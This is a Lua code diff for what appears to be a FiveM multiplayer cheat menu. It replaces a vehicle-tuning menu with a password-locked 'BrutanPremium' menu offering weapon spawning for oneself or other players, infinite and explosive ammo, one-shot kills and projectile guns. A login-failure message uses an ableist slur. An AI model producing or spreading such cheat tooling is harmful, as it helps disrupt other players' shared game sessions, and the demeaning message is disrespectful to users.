-                elseif VladmirAK47.MenuButton('~h~~p~▶~s~ ~h~Performance ~s~Tuning', 'performance') then
-                elseif VladmirAK47.Button('~h~Change Car License Plate') then
-                    cu()
-                elseif
-                    VladmirAK47.CheckBox(
-                        '~h~~gr~a~y~i~b~n~o~bow ~s~Vehicle Colour',
-                        RainbowVeh,
-                        function(dR)
-                            RainbowVeh = dR
-                        end
-                    )
-                 then
-                elseif VladmirAK47.Button('~h~Make vehicle ~y~dirty') then
-                    Clean(GetVehiclePedIsUsing(PlayerPedId(-1)))
-                elseif VladmirAK47.Button('~h~Make vehicle clean') then
-                    Clean2(GetVehiclePedIsUsing(PlayerPedId(-1)))
-                elseif
-                    VladmirAK47.CheckBox(
-                        '~h~~gr~a~y~i~b~n~o~bow ~s~Neons & Headlights',
-                        rainbowh,
-                        function(dR)
-                            rainbowh = dR
-                        end
-                    )
-                 then
+
+
+                    BrutanPremium.Display()
+            elseif BrutanPremium.IsMenuOpened("SingleWepPlayer") then
+                for i = 1, #allWeapons do
+                    if BrutanPremium.Button(allWeapons[i]) then
+                        GiveWeaponToPed(GetPlayerPed(SelectedPlayer), GetHashKey(allWeapons[i]), 250, false, true)
+                    end
                 end
-                VladmirAK47.Display()
-            elseif VladmirAK47.IsMenuOpened('BoostMenu') then
-                if
-                    VladmirAK47.ComboBox(
-                        '~h~Engine Power Booster',
-                        dD,
-                        dB,
-                        dC,
-                        function(ag, ah)
-                            dB = ag
-                            dC = ah
-                            SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), dC * 20.0)
-                        end
-                    )
-                 then
-                elseif
-                    VladmirAK47.CheckBox(
-                        '~h~Engine  Booster 2x',
-                        t2x,
-                        function(dR)
-                            t2x = dR
-                            t4x = false
-                            t10x = false
-                            t16x = false
-                            txd = false
-                            tbxd = false
-                        end
-                    )
-                 then
-                elseif
-                    VladmirAK47.CheckBox(
-                        '~h~Engine  Booster 4x',
-                        t4x,
-                        function(dR)
-                            t2x = false
-                            t4x = dR
-                            t10x = false
-                            t16x = false
-                            txd = false
-                            tbxd = false
-                        end
-                    )
-                 then
-                elseif
-                    VladmirAK47.CheckBox(
-                        '~h~Engine Booster 10x',
-                        t10x,
-                        function(dR)
-                            t2x = false
-                            t4x = false
-                            t10x = dR
-                            t16x = false
-                            txd = false
-                            tbxd = false
-                        end
-                    )
-                 then
-                elseif
-                    VladmirAK47.CheckBox(
-                        '~h~Engine Booster 16x',
-                        t16x,
-                        function(dR)
-                            t2x = false
-                            t4x = false
-                            t10x = false
-                            t16x = dR
-                            txd = false
-                            tbxd = false
-                        end
-                    )
-                 then
-                elseif
-                    VladmirAK47.CheckBox(
-                        '~h~Engine Booster 20x',
-                        txd,
-                        function(dR)
-                            t2x = false
-                            t4x = false
-                            t10x = false
-                            t16x = false
-                            txd = dR
-                            tbxd = false
-                        end
-                    )
-                 then
-                elseif
-                    VladmirAK47.CheckBox(
-                        '~h~Engine Booster 24x',
-                        tbxd,
-                        function(dR)
-                            t2x = false
-                            t4x = false
-                            t10x = false
-                            t16x = false
-                            txd = false
-                            tbxd = dR
-                        end
-                    )
-                 then
+
+
+                BrutanPremium.Display()
+            elseif BrutanPremium.IsMenuOpened("WeaponMenu") then
+                if BrutanPremium.MenuButton("~r~→  ~s~Single Weapon Spawner", "SingleWeaponMenu") then
+                elseif BrutanPremium.Button("Give All Weapons") then
+                    for i = 1, #allWeapons do
+                        GiveWeaponToPed(PlayerPedId(), GetHashKey(allWeapons[i]), 250, false, false)
+                    end
+                elseif BrutanPremium.Button("Remove All Weapons") then
+                    for i = 1, #allWeapons do
+                        RemoveAllPedWeapons(PlayerPedId(), true)
+                    end
+                elseif BrutanPremium.Button("Give Ammo") then
+                    for i = 1, #allWeapons do
+                        AddAmmoToPed(PlayerPedId(), GetHashKey(allWeapons[i]), 250)
+                    end
+                elseif BrutanPremium.CheckBox(
+                    "No Reload",
+                    dwadawdwd,
+                    function(enabled)
+                        dwadawdwd = enabled
+                        SetPedInfiniteAmmoClip(PlayerPedId(), dwadawdwd)
+                    end)
+                then
+                elseif BrutanPremium.CheckBox(
+                    "Infinite Ammo",
+                    JYGNDJ,
+                    function(enabled)
+                        JYGNDJ = enabled
+                        SetPedInfiniteAmmo(PlayerPedId(), JYGNDJ)
+                    end)
+                then
+                elseif BrutanPremium.CheckBox(
+                    "Explosive Ammo",
+                    bifegfubffff,
+                    function(enabled)
+                        bifegfubffff = enabled
+                    end)
+                then
+                elseif BrutanPremium.CheckBox(
+                    "Oneshot",
+                    Oneshot,
+                    function(enabled)
+                        Oneshot = enabled
+                    end)
+                then
+				elseif BrutanPremium.CheckBox(
+                    "No Recoil",
+                    NOXJDSS,
+                    function(enabled)
+                        NOXJDSS = enabled
+                    end)
+                then
+                elseif BrutanPremium.CheckBox(
+                    "Delete Gun",
+                    WADOHWIB,
+                    function(enabled)
+                        WADOHWIB = enabled
+                    end)
+                then
+                elseif BrutanPremium.MenuButton("~r~→  ~s~Weapon Customization", "WeaponCustomization") then
+                elseif BrutanPremium.MenuButton("~r~→  ~s~Bullet Gun Options", "BulletGunMenu") then
                 end
-                VladmirAK47.Display()
-            elseif IsDisabledControlPressed(0, 19) and IsDisabledControlPressed(0, 48) then
-                if H4tuf5 then
-                    VladmirAK47.OpenMenu('VladmirAK47')
+
+                BrutanPremium.Display()
+            elseif BrutanPremium.IsMenuOpened("WeaponCustomization") then
+                if BrutanPremium.CheckBox(
+                    "Rainbow Tint",
+                    rainbowTint,
+                    function(enabled)
+                        rainbowTint = enabled
+                    end)
+                then
+                elseif BrutanPremium.ComboBox("Weapon Tints", { "Normal", "Green", "Gold", "Pink", "Army", "LSPD", "Orange", "Platinum" }, currentTint, selectedTint, function(currentIndex, selectedIndex)
+                    currentTint = currentIndex
+                    selectedTint = selectedIndex
+
+                    if selectedTint == 1 then
+                        SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0)
+                    end
+                    if selectedTint == 2 then
+                        SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 1)
+                    end
+                    if selectedTint == 3 then
+                        SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 2)
+                    end
+                    if selectedTint == 4 then
+                        SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 3)
+                    end
+                    if selectedTint == 5 then
+                        SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 4)
+                    end
+                    if selectedTint == 6 then
+                        SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 5)
+                    end
+                    if selectedTint == 7 then
+                        SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 6)
+                    end
+                    if selectedTint == 8 then
+                        SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 7)
+                    end
+                end)
+                then
+                elseif BrutanPremium.Button("~g~Add Special Finish") then
+                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x27872C90)
+                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xD7391086)
+                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x9B76C72C)
+                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x487AAE09)
+                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x85A64DF9)
+                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x377CD377)
+                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xD89B9658)
+                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x4EAD7533)
+                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x4032B5E7)
+                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x77B8AB2F)
+                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x7A6A7B7B)
+                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x161E9241)
+                elseif BrutanPremium.Button("~r~Remove Special Finish") then
+                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x27872C90)
+                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xD7391086)
+                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x9B76C72C)
+                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x487AAE09)
+                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x85A64DF9)
+                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x377CD377)
+                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xD89B9658)
+                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x4EAD7533)
+                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x4032B5E7)
+                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x77B8AB2F)
+                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x7A6A7B7B)
+                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x161E9241)
+                elseif BrutanPremium.Button("~g~Add Suppressor") then
+                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x65EA7EBB)
+                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x837445AA)
+                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xA73D4664)
+                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xC304849A)
+                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xE608B35E)
+                elseif BrutanPremium.Button("~r~Remove Suppressor") then
+                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x65EA7EBB)
+                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x837445AA)
+                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xA73D4664)
+                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xC304849A)
+                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xE608B35E)
+                elseif BrutanPremium.Button("~g~Add Scope") then
+                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x9D2FBF29)
+                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xA0D89C42)
+                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xAA2C45B4)
+                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xD2443DDC)
+                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x3CC6BA57)
+                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x3C00AFED)
+                elseif BrutanPremium.Button("~r~Remove Scope") then
+                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x9D2FBF29)
+                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xA0D89C42)
+                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xAA2C45B4)
+                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xD2443DDC)
+                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x3CC6BA57)
+                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x3C00AFED)
+                end
+
+                BrutanPremium.Display()
+            elseif BrutanPremium.IsMenuOpened("BulletGunMenu") then
+                if BrutanPremium.CheckBox(
+                    "Vehicle Gun",
+                    vehicleGun,
+                    function(enabled)
+                        vehicleGun = enabled
+                    end)
+                then
+                elseif BrutanPremium.ComboBox("Vehicle To Shoot", vehicles, currentVehicle, selectedVehicle, function(currentIndex, selectedIndex)
+                    currentVehicle = currentIndex
+                    selectedVehicle = selectedIndex
+
+                end)
+                then
+                elseif BrutanPremium.ComboBox("Vehicle Speed", vehicleSpeed, currentVehicleSpeed, selectedVehicleSpeed, function(currentIndex, selectedIndex)
+                    currentVehicleSpeed = currentIndex
+                    selectedVehicleSpeed = selectedIndex
+                end)
+                then
+                elseif BrutanPremium.CheckBox(
+                    "Ped Gun",
+                    pedGun,
+                    function(enabled)
+                        pedGun = enabled
+                end)
+                then
+                elseif BrutanPremium.ComboBox("Ped To Shoot", peds, currentPed, selectedPed, function(currentIndex, selectedIndex)
+                    currentPed = currentIndex
+                    selectedPed = selectedIndex
+                end)
+                then
+                elseif BrutanPremium.CheckBox(
+                    "Bullet Gun",
+                    bulletGun,
+                    function(enabled)
+                        bulletGun = enabled
+                    end)
+                then
+                elseif BrutanPremium.ComboBox("Bullet", bullets, currentBullet, selectedBullet, function(currentIndex, selectedIndex)
+                    currentBullet = currentIndex
+                    selectedBullet = selectedIndex
+                    end)
+                then
+                end
+
+
+
+
+                BrutanPremium.Display()
+            elseif BrutanPremium.IsMenuOpened("SingleWeaponMenu") then
+                for i = 1, #allWeapons do
+                    if BrutanPremium.Button(allWeapons[i]) then
+                        GiveWeaponToPed(PlayerPedId(), GetHashKey(allWeapons[i]), 250, false, false)
+                    end
+                end
+
+
+
+                BrutanPremium.Display()
+            elseif IsDisabledControlPressed(0, 162) then
+                if planeisbest then
+                    trynaskidhuh("MainMenu")
                 else
-                    TmEM1U()
+                    local temp = KeyboardInput("Enter Password", "brutanpremium", 100)
+                    if temp == dEI then
+                        drawNotification("~r~~h~Well done, you just logged in!")
+                        planeisbest = true
+                        trynaskidhuh("MainMenu")
+                    else
+                        drawNotification("~r~~h~Login has failed, are you fucking retarded?")
+                    end
                 end
-                VladmirAK47.Display()
             end
+
             Citizen.Wait(0)
         end
-    end
-)
+    end)
